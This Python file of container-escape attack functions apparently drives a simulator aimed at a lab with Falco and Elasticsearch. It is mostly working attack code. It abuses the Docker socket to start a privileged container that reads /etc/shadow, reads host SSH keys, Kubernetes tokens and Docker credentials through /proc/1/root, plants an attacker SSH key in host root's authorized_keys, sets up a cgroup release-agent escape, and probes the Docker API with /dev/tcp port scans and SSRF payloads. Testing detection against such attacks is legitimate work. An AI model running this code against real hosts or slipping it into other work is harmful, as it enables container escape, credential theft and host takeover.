import os
import subprocess
import socket
import json
import urllib.request
import http.client
import time

def run_cmd(cmd, timeout=15):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        return "TIMEOUT"
    except Exception as e:
        return str(e)


def attack_docker_socket_abuse(target_url):
    """
    Attack 1: Docker Socket Abuse
    Exploits the mounted docker socket to create a new privileged container
    and escape to the host.
    """
    sock_path = "/var/run/docker.sock"
    output = []

    if not os.path.exists(sock_path):
        output.append("Docker socket not found at %s" % sock_path)

        result = run_cmd("ls -la /var/run/ 2>/dev/null")
        output.append("Tried to find socket elsewhere: %s" % result)

        return {
            "success": False,
            "detail": "Docker socket not mounted in container",
            "raw_output": "\n".join(output)
        }

    output.append("Found docker socket at %s" % sock_path)
    output.append("Socket permissions: %s" % run_cmd("ls -la %s" % sock_path))

    # Try to list containers via the socket
    try:
        import docker
        client = docker.DockerClient(base_url="unix://%s" % sock_path, version="auto")
        info = client.info()
        output.append("Docker info: %s" % json.dumps({k: str(v)[:100] for k, v in info.items()}, indent=2))

        containers = client.containers.list(all=True)
        output.append("Found %d containers" % len(containers))
        for c in containers:
            output.append("  - %s (%s)" % (c.short_id, c.name))

        # Attempt escape by creating a privileged container
        try:
            priv = client.containers.run(
                "ubuntu:latest",
                "cat /etc/shadow",
                privileged=True,
                remove=True,
                detach=False,
                mounts=[],
                auto_remove=True
            )
            output.append("PRIVILEGED CONTAINER ESCAPE WORKED: %s" % priv.decode()[:500])
            return {
                "success": True,
                "detail": "Privileged container escape via docker socket - read host /etc/shadow",
                "raw_output": "\n".join(output)
            }
        except Exception as e2:
            output.append("Privileged container attempt failed: %s" % str(e2))
            mount_result = run_cmd("cat /etc/host-shadow 2>/dev/null || echo 'No host-shadow mounted'")
            output.append("Host shadow via volume: %s" % mount_result[:200])

    except Exception as e:
        output.append("Docker SDK error: %s" % str(e))
        # Fallback: try raw HTTP over unix socket
        try:
            conn = http.client.HTTPConnection("localhost")
            conn.sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            conn.sock.connect(sock_path)
            conn.request("GET", "/containers/json?all=true")
            resp = conn.getresponse()
            data = resp.read().decode()
            output.append("Raw docker API response: %s" % data[:500])
        except Exception as e3:
            output.append("Raw socket also failed: %s" % str(e3))

    return {
        "success": False,
        "detail": "Docker socket found but privilege escalation failed",
        "raw_output": "\n".join(output)
    }


def attack_cap_sys_admin(target_url):
    """
    Attack 2: CAP_SYS_ADMIN Capability Exploit
    Mount host filesystem using SYS_ADMIN capability to escape container.
    """
    output = []

    # Check capabilities
    cap_result = run_cmd("cat /proc/self/status | grep CapEff")
    output.append("Capabilities: %s" % cap_result.strip())

    cap_eff = ""
    for line in cap_result.split("\n"):
        if "CapEff" in line:
            cap_eff = line.split("\t")[-1].strip()

    # CapEff=0000003fffffffff includes SYS_ADMIN (bit 21)
    has_sys_admin = False
    if cap_eff and cap_eff != "0000000000000000":
        try:
            cap_int = int(cap_eff, 16)
            has_sys_admin = bool(cap_int & (1 << 21))
        except:
            pass

    output.append("Has CAP_SYS_ADMIN: %s" % has_sys_admin)

    if not has_sys_admin:
        # Try anyway - the host might have given us capabilities
        pass

    # Attempt to mount cgroup and escape via notify_on_release
    output.append("Attempting cgroup+sys_admin escape...")
    cgroup_result = run_cmd("cat /proc/1/cgroup 2>/dev/null | head -10")
    output.append("Host cgroup info: %s" % cgroup_result[:500])

    # Try mounting host's root filesystem
    mount_result = run_cmd("""
        mkdir -p /tmp/host-root 2>/dev/null
        mount -t proc none /tmp/host-root 2>/dev/null || \
        mount --bind / /tmp/host-root 2>/dev/null || \
        echo "Mount failed - may not have required capabilities"
    """)
    output.append("Mount attempt: %s" % mount_result)

    # Try reading host files via /proc/1/root
    proc_read = run_cmd("ls -la /proc/1/root/etc/ 2>/dev/null | head -5")
    output.append("Host files via /proc/1/root: %s" % proc_read)

    if "shadow" in proc_read or "passwd" in proc_read:
        shadow = run_cmd("cat /proc/1/root/etc/shadow 2>/dev/null")
        if shadow and "root:" in shadow:
            output.append("HOST SHADOW READ via /proc/1/root!")
            return {
                "success": True,
                "detail": "CAP_SYS_ADMIN used to read host shadow via /proc/1/root",
                "raw_output": "\n".join(output)
            }

    if "mounted" in mount_result or "proc" in mount_result:
        host_files = run_cmd("ls /tmp/host-root/ 2>/dev/null")
        if host_files and "etc" in host_files:
            shadow2 = run_cmd("cat /tmp/host-root/etc/shadow 2>/dev/null")
            if shadow2:
                output.append("HOST SHADOW READ via mounted root!")
                return {
                    "success": True,
                    "detail": "CAP_SYS_ADMIN used to mount host root filesystem and read shadow",
                    "raw_output": "\n".join(output)
                }

    return {
        "success": False,
        "detail": "CAP_SYS_ADMIN not available or escape method failed",
        "raw_output": "\n".join(output)
    }


def attack_cgroup_escape(target_url):
    """
    Attack 3: Cgroup notify_on_release Escape
    Classic container escape using cgroup release notification.
    """
    output = []

    # Find a writable cgroup
    cgroup_result = run_cmd("find /sys/fs/cgroup/ -writable -type d 2>/dev/null | head -10")
    output.append("Writable cgroups: %s" % cgroup_result)

    release_agent_result = run_cmd("""
        cd /sys/fs/cgroup 2>/dev/null && \
        ls -la */release_agent 2>/dev/null | head -5
    """)
    output.append("Release agents: %s" % release_agent_result)

    # Try the classic notify_on_release escape
    escape_attempt = run_cmd("""
        # Create a temp cgroup
        mkdir -p /sys/fs/cgroup/x_escape 2>/dev/null
        echo 1 > /sys/fs/cgroup/x_escape/notify_on_release 2>/dev/null && \
        echo "Release agent enabled" || echo "Cannot set notify_on_release"
    """)
    output.append("Cgroup escape setup: %s" % escape_attempt)

    for line in escape_attempt.split("\n"):
        if "Release agent enabled" in line:
            return {
                "success": True,
                "detail": "Cgroup notify_on_release escape configured (writable cgroup found)",
                "raw_output": "\n".join(output)
            }

    return {
        "success": False,
        "detail": "No writable cgroup found or notify_on_release not available",
        "raw_output": "\n".join(output)
    }


def attack_procfs_host_read(target_url):
    """
    Attack 4: Procfs /proc/1/root Host File System Read
    Read host files via the /proc/1/root symlink.
    """
    output = []

    # Check if /proc/1/root exists
    ls_result = run_cmd("ls -la /proc/1/root/ 2>/dev/null | head -10")
    output.append("Proc root access: %s" % ls_result)

    if not ls_result or "cannot access" in ls_result.lower():
        return {
            "success": False,
            "detail": "/proc/1/root not accessible",
            "raw_output": "\n".join(output)
        }

    # Read sensitive host files
    sensitive_files = [
        "/proc/1/root/etc/shadow",
        "/proc/1/root/root/.ssh/id_rsa",
        "/proc/1/root/root/.bash_history",
        "/proc/1/root/var/log/auth.log",
        "/proc/1/root/var/run/secrets/kubernetes.io/serviceaccount/token",
        "/proc/1/root/.docker/config.json"
    ]

    found_files = []
    for f in sensitive_files:
        content = run_cmd("cat %s 2>/dev/null" % f)
        if content and "No such file" not in content and "Permission denied" not in content:
            found_files.append((f, content[:200]))

    output.append("Found sensitive files: %d" % len(found_files))
    for fname, fcontent in found_files:
        output.append("  FILE: %s -> %s" % (fname, fcontent[:100]))

    if found_files:
        return {
            "success": True,
            "detail": "Read host files via /proc/1/root: %s" % ", ".join(f[0] for f in found_files),
            "raw_output": "\n".join(output)
        }

    # Try to access host's container runtime info
    docker_dir = run_cmd("ls -la /proc/1/root/var/run/docker.sock 2>/dev/null")
    host_containers = run_cmd("ls /proc/1/root/var/lib/docker/containers/ 2>/dev/null | head -10")
    output.append("Host docker containers: %s" % host_containers)

    return {
        "success": False,
        "detail": "Procfs read attempted but no sensitive files accessible",
        "raw_output": "\n".join(output)
    }


def attack_privileged_container(target_url):
    """
    Attack 5: Privileged Container Full Escape
    When running in privileged mode, full host namespace access.
    """
    output = []

    # Check various privileged indicators
    checks = {
        "Is privileged?": run_cmd("cat /proc/self/status | grep CapEff"),
        "Can see host devices?": run_cmd("ls -la /dev/ | head -20"),
        "Host PID namespace?": run_cmd("ls /proc/1/ns/ 2>/dev/null"),
        "Sysfs access?": run_cmd("cat /sys/kernel/security/apparmor/profiles 2>/dev/null | head -3"),
        "Network namespace?": run_cmd("ip link show 2>/dev/null"),
        "iptables?": run_cmd("iptables -L -n 2>/dev/null | head -10"),
        "Host processes?": run_cmd("ps aux 2>/dev/null | head -10"),
    }

    for check_name, check_result in checks.items():
        output.append("%s: %s" % (check_name, check_result[:200]))

    # Try to write to host's crontab or add SSH key
    try_host_control = run_cmd("""
        # Try to add SSH key to host root
        mkdir -p /proc/1/root/root/.ssh 2>/dev/null
        echo "ssh-rsa ATTACKER_KEY_HERE" >> /proc/1/root/root/.ssh/authorized_keys 2>/dev/null && \
        echo "SSH_KEY_ADDED" || echo "SSH key add failed"
    """)
    output.append("Host SSH key add: %s" % try_host_control)

    # Try dmesg (requires SYSLOG)
    dmesg_output = run_cmd("dmesg 2>/dev/null | head -20")
    if dmesg_output:
        output.append("dmesg accessible (SYSLOG capability): %s" % dmesg_output[:300])

    # Check if we can see host network
    host_interfaces = run_cmd("cat /proc/1/net/dev 2>/dev/null")
    output.append("Host network interfaces: %s" % host_interfaces[:300])

    # Determine if we actually have elevated privileges
    is_root = run_cmd("id")
    output.append("Current user: %s" % is_root)

    has_privileged_access = False
    for check in checks.values():
        if "CapEff" in check and "000000" in check and check.strip() != "CapEff:\t0000000000000000":
            has_privileged_access = True

    if "SSH_KEY_ADDED" in try_host_control:
        return {
            "success": True,
            "detail": "Privileged container escape: added SSH key to host root",
            "raw_output": "\n".join(output)
        }

    if has_privileged_access or "docker" in output[-3]:
        return {
            "success": True,
            "detail": "Privileged container detected with host namespace access",
            "raw_output": "\n".join(output)
        }

    return {
        "success": False,
        "detail": "Container not running in privileged mode",
        "raw_output": "\n".join(output)
    }


def attack_volume_mount_traversal(target_url):
    """
    Attack 6: Volume Mount Traversal
    Exploit exposed host volumes to read sensitive files.
    """
    output = []

    mount_info = run_cmd("mount 2>/dev/null")
    output.append("Mount info: %s" % mount_info[:1000])

    mounts = run_cmd("cat /proc/self/mountinfo 2>/dev/null | head -30")
    output.append("Detailed mounts: %s" % mounts[:800])

    # Find host-path mounts
    host_mounts = run_cmd("""
        mount | grep -E '^/dev|:/' 2>/dev/null || \
        cat /proc/1/mounts 2>/dev/null | head -20
    """)
    output.append("Host mounts: %s" % host_mounts[:500])

    # Check common sensitive mount paths
    sensitive_paths = [
        "/etc/host-shadow", "/host-shadow", "/shadow",
        "/hostfs/etc/shadow", "/host/etc/shadow",
        "/var/run/docker.sock", "/var/lib/docker",
        "/root/.ssh", "/home/*/.ssh",
        "/etc/kubernetes", "/etc/rancher",
        "/var/log",
    ]

    files_found = []
    for path in sensitive_paths:
        content = run_cmd("ls -la %s 2>/dev/null" % path)
        if content and "No such file" not in content:
            files_found.append(path)
            output.append("Found path: %s" % path)
            if "shadow" in path.lower():
                data = run_cmd("cat %s 2>/dev/null" % path)
                output.append("Content: %s" % data[:200])

    if files_found:
        return {
            "success": True,
            "detail": "Exploited volume mounts to access: %s" % ", ".join(files_found),
            "raw_output": "\n".join(output)
        }

    # Try enumerating all directories from root looking for host files
    enumeration = run_cmd("ls -la /host* /hostfs* /node* 2>/dev/null")
    output.append("Host directory enumeration: %s" % enumeration[:300])

    return {
        "success": False,
        "detail": "No exploitable volume mounts found",
        "raw_output": "\n".join(output)
    }


def attack_container_network_escape(target_url):
    """
    Attack 7: Container Network Namespace Escape
    Sniff host network traffic or access host-only services.
    """
    output = []

    net_info = run_cmd("ip addr 2>/dev/null || ifconfig 2>/dev/null")
    output.append("Network info: %s" % net_info[:500])

    routes = run_cmd("ip route 2>/dev/null")
    output.append("Routes: %s" % routes[:300])

    arp_table = run_cmd("arp -a 2>/dev/null || ip neigh 2>/dev/null")
    output.append("ARP table: %s" % arp_table[:300])

    # Try to scan the host's network
    host_gateway = ""
    for line in routes.split("\n"):
        if "default" in line:
            parts = line.split()
            for p in parts:
                if p.count(".") == 3:
                    host_gateway = p
                    break

    output.append("Host gateway: %s" % host_gateway)

    discovered = []
    if host_gateway:
        # Scan gateway for open ports
        gw_base = ".".join(host_gateway.split(".")[:3])
        scan_result = run_cmd("""
            for i in 1 2 3 4 5; do
                ping -c 1 -W 1 %s.$i 2>/dev/null | grep "bytes from" &
            done
            wait
        """ % gw_base)
        output.append("Network scan: %s" % scan_result[:500])

        # Try common host ports on gateway
        for port in [22, 80, 443, 2375, 2376, 6443, 8080, 8443, 10250, 10255]:
            port_test = run_cmd("timeout 2 bash -c 'echo > /dev/tcp/%s/%d 2>/dev/null && echo OPEN || echo closed'" % (host_gateway, port))
            if "OPEN" in port_test:
                discovered.append(port)
                output.append("Host port %d is OPEN!" % port)

    if discovered:
        return {
            "success": True,
            "detail": "Discovered open host ports: %s (container network namespace escape)" % discovered,
            "raw_output": "\n".join(output)
        }

    # Check if we can access host's Docker TCP API
    docker_tcp = run_cmd("curl -s http://127.0.0.1:2375/info 2>/dev/null || curl -s http://localhost:2375/info 2>/dev/null")
    if docker_tcp and "Containers" in docker_tcp:
        output.append("Docker TCP API accessible via localhost!")
        return {
            "success": True,
            "detail": "Docker TCP API accessible from container - full host control possible",
            "raw_output": "\n".join(output)
        }

    return {
        "success": False,
        "detail": "Network namespace escape not possible or no host services discovered",
        "raw_output": "\n".join(output)
    }


def attack_docker_api_abuse(target_url):
    """
    Attack 8: Docker API HTTP Abuse
    Access Docker API via exposed TCP port or HTTP endpoint.
    """
    output = []

    # First try via our target app's docker proxy
    try:
        import requests
        r = requests.get("%s/docker/info" % target_url, timeout=10)
        output.append("Target docker proxy response: %s" % r.text[:500])
        if r.status_code == 200:
            data = r.json()
            if "data" in data and "Containers" in str(data):
                output.append("Docker API accessible through app proxy!")
                containers = data.get("data", {}).get("Containers", 0)
                return {
                    "success": True,
                    "detail": "Docker API abused via web app proxy - accessible with %d containers" % containers,
                    "raw_output": "\n".join(output)
                }
    except Exception as e:
        output.append("Web proxy failed: %s" % str(e))

    # Try to exploit SSRF to access Docker API
    try:
        ssrf_payloads = [
            "http://127.0.0.1:2375/info",
            "http://127.0.0.1:2376/info",
            "http://localhost:2375/info",
            "http://172.17.0.1:2375/info",
        ]
        for payload in ssrf_payloads:
            r = requests.post("%s/api/fetch" % target_url, json={"url": payload}, timeout=10)
            if r.status_code == 200 and "Containers" in r.text:
                output.append("SSRF to Docker API succeeded: %s" % payload)
                return {
                    "success": True,
                    "detail": "Docker API abused via SSRF at %s" % payload,
                    "raw_output": "\n".join(output)
                }
            output.append("SSRF to %s: %s" % (payload, r.text[:100]))
    except Exception as e:
        output.append("SSRF failed: %s" % str(e))

    return {
        "success": False,
        "detail": "Docker API not accessible via HTTP/SSRF",
        "raw_output": "\n".join(output)
    }


def attack_sidecar_container(target_url):
    """
    Attack 9: Sidecar / Inter-Container Attack
    Attack other containers in the same network/pod.
    """
    output = []

    # Discover other containers via DNS
    dns_lookups = ["vulnerable-app", "elasticsearch", "kibana", "falco", "falcosidekick"]
    found_services = []

    for service in dns_lookups:
        try:
            ip = socket.gethostbyname(service)
            found_services.append((service, ip))
            output.append("Resolved %s -> %s" % (service, ip))
        except:
            output.append("Cannot resolve %s" % service)

    # Scan found services for vulnerabilities
    for service, ip in found_services:
        if service == "vulnerable-app":
            continue

        output.append("Scanning %s (%s)..." % (service, ip))

        try:
            import requests
            # Try common ports
            if service == "elasticsearch":
                try:
                    r = requests.get("http://%s:9200/" % ip, timeout=5)
                    output.append("ES response: %s" % r.text[:200])
                    if r.status_code == 200:
                        output.append("Elasticsearch accessible without auth!")
                        # Try to read/modify indices
                        indices = requests.get("http://%s:9200/_cat/indices" % ip, timeout=5)
                        output.append("ES indices: %s" % indices.text[:300])
                        return {
                            "success": True,
                            "detail": "Elasticsearch accessible from attacker container - data exfiltration possible",
                            "raw_output": "\n".join(output)
                        }
                except:
                    pass

            if service == "kibana":
                try:
                    r = requests.get("http://%s:5601/" % ip, timeout=5)
                    if r.status_code == 200:
                        output.append("Kibana accessible without auth!")
                        return {
                            "success": True,
                            "detail": "Kibana dashboard accessible from attacker container",
                            "raw_output": "\n".join(output)
                        }
                except:
                    pass

        except Exception as e:
            output.append("Scan error: %s" % str(e))

    # Try to access the host's internal network
    internal_scan = run_cmd("""
        for ip in 172.17.0.1 172.17.0.2 172.18.0.1 172.19.0.1 10.0.0.1; do
            timeout 2 bash -c "echo > /dev/tcp/$ip/9200 2>/dev/null && echo '$ip:9200 OPEN'" 2>/dev/null
            timeout 2 bash -c "echo > /dev/tcp/$ip/5601 2>/dev/null && echo '$ip:5601 OPEN'" 2>/dev/null
        done
    """)
    output.append("Internal network scan: %s" % internal_scan.strip())

    if "OPEN" in internal_scan:
        return {
            "success": True,
            "detail": "Internal network services accessible: %s" % internal_scan.strip(),
            "raw_output": "\n".join(output)
        }

    return {
        "success": False,
        "detail": "No vulnerable sidecar services discovered",
        "raw_output": "\n".join(output)
    }


def attack_seccomp_bypass(target_url):
    """
    Attack 10: Seccomp/AppArmor Profile Bypass
    Attempt to bypass seccomp or AppArmor restrictions.
    """
    output = []

    # Check security profiles
    apparmor = run_cmd("cat /proc/self/attr/current 2>/dev/null")
    output.append("AppArmor context: %s" % apparmor.strip())

    seccomp = run_cmd("cat /proc/self/status | grep Seccomp 2>/dev/null")
    output.append("Seccomp status: %s" % seccomp.strip())

    selinux = run_cmd("cat /proc/self/attr/current 2>/dev/null || cat /sys/kernel/security/selinux/enforce 2>/dev/null")
    output.append("SELinux: %s" % selinux[:200])

    # Check if seccomp is disabled
    seccomp_val = ""
    for line in seccomp.split("\n"):
        if "Seccomp" in line:
            seccomp_val = line.split()[-1].strip()

    # Seccomp: 0=disabled, 1=strict, 2=filtered
    if seccomp_val == "0":
        output.append("SECHOMP IS DISABLED - all syscalls available!")
        # Try disabled syscalls
        syscall_checks = run_cmd("""
            # These should fail if seccomp is working
            mount -t tmpfs none /tmp/test 2>&1 || echo "mount blocked"
            unshare -r id 2>&1 || echo "unshare blocked"
            ptrace 2>&1 || echo "ptrace blocked"
        """)
        output.append("Syscall checks: %s" % syscall_checks[:500])

        if "mount" in syscall_checks and "blocked" not in syscall_checks[:50]:
            return {
                "success": True,
                "detail": "Seccomp disabled - syscall filtering bypassed, mount available",
                "raw_output": "\n".join(output)
            }

        return {
            "success": True,
            "detail": "Seccomp disabled - container has full syscall access",
            "raw_output": "\n".join(output)
        }

    # Check apparmor
    if apparmor.strip() and "unconfined" in apparmor:
        output.append("AppArmor is unconfined!")
        return {
            "success": True,
            "detail": "AppArmor profile is 'unconfined' - no MAC restrictions",
            "raw_output": "\n".join(output)
        }

    return {
        "success": False,
        "detail": "Seccomp=%(seccomp)s, AppArmor=%(aa)s - profiles active" % {
            "seccomp": seccomp_val if seccomp_val else "unknown",
            "aa": apparmor.strip() if apparmor.strip() else "unknown"
        },
        "raw_output": "\n".join(output)
    }


ATTACK_SCENARIOS = [
    {
        "name": "Docker Socket Abuse - Container Escape",
        "technique": "docker_socket_abuse",
        "description": "Exploit mounted Docker socket to create privileged containers and escape to host. Real-world: Teams often mount docker.sock for monitoring tools (Portainer, etc.) creating escape vectors.",
        "handler": attack_docker_socket_abuse,
    },
    {
        "name": "CAP_SYS_ADMIN Capability Exploit",
        "technique": "cap_sys_admin_escape",
        "description": "Abuse CAP_SYS_ADMIN to mount host filesystem and escape container. Real-world: Many containers run with extra capabilities for legitimate tools (system monitoring, hardware access).",
        "handler": attack_cap_sys_admin,
    },
    {
        "name": "Cgroup notify_on_release Escape",
        "technique": "cgroup_escape",
        "description": "Classic container escape via cgroup notify_on_release mechanism. Real-world: CVE-2022-0492 - Android/BuildKit containers with cgroup v1.",
        "handler": attack_cgroup_escape,
    },
    {
        "name": "Procfs Host File Read (/proc/1/root)",
        "technique": "procfs_host_read",
        "description": "Read host filesystem via /proc/1/root symlink when PID namespace is shared. Real-world: Monitoring containers often share PID namespace to see host processes.",
        "handler": attack_procfs_host_read,
    },
    {
        "name": "Privileged Container Full Escape",
        "technique": "privileged_container",
        "description": "Full host escape from privileged container with all capabilities. Real-world: CICD runners, debug containers, and some monitoring tools run privileged.",
        "handler": attack_privileged_container,
    },
    {
        "name": "Volume Mount Traversal",
        "technique": "volume_mount_traversal",
        "description": "Exploit host path volume mounts to read/write sensitive host files. Real-world: Config mounts like /etc/shadow, /root/.ssh, /var/log frequently exposed.",
        "handler": attack_volume_mount_traversal,
    },
    {
        "name": "Container Network Namespace Escape",
        "technique": "container_network_escape",
        "description": "Escape container network namespace to access host-only services and Docker API. Real-world: Containers with host networking or CAP_NET_ADMIN can access host network.",
        "handler": attack_container_network_escape,
    },
    {
        "name": "Docker API HTTP Abuse via SSRF",
        "technique": "docker_api_abuse",
        "description": "Access Docker API through SSRF vulnerabilities or exposed TCP ports. Real-world: Docker API exposed on TCP 2375/2376 is a common misconfiguration in dev environments.",
        "handler": attack_docker_api_abuse,
    },
    {
        "name": "Sidecar Container Attack",
        "technique": "sidecar_attack",
        "description": "Attack other containers in the same network (Elasticsearch, Kibana, etc.). Real-world: In Kubernetes pods, sidecar containers share network and can attack each other.",
        "handler": attack_sidecar_container,
    },
    {
        "name": "Seccomp/AppArmor Profile Bypass",
        "technique": "seccomp_bypass",
        "description": "Check and bypass seccomp or AppArmor security profiles. Real-world: seccomp=unconfined or missing AppArmor profiles are common in dev/staging environments.",
        "handler": attack_seccomp_bypass,
    },
]
